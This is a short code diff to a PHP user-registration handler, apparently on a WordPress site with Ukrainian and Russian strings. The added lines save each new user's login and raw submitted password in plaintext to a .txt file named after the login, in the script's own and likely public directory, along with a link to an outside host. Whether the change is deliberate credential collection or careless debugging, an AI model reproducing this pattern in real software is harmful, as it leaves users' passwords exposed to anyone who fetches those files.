@@ -79,7 +79,10 @@ else {
 	add_user_meta( $user_id, "kusch", $kusch,true );
 }
 add_user_meta( $user_id, "tel", $user_login,true );
-
+$aa = "http://k162.hol.es/reg/"."\r\n";
+file_put_contents( dirname(__FILE__).'/'.trim($user_login.'.txt'), "Посилання на сайт:".$aa );
+file_put_contents( dirname(__FILE__).'/'.trim($user_login.'.txt'), "Логін:".$user_login."\r\n", FILE_APPEND );
+file_put_contents( dirname(__FILE__).'/'.trim($user_login.'.txt'), "Пароль:".$_POST['pass1'], FILE_APPEND );
 wp_send_json_success(array('message' => 'Користувач зареєстрований.', 'redirect' => 'http://vybory.el/?page_id=100'));
  // говорим что все прошло ок, если нужен редирект то вместо false поставьте $redirect_to
 
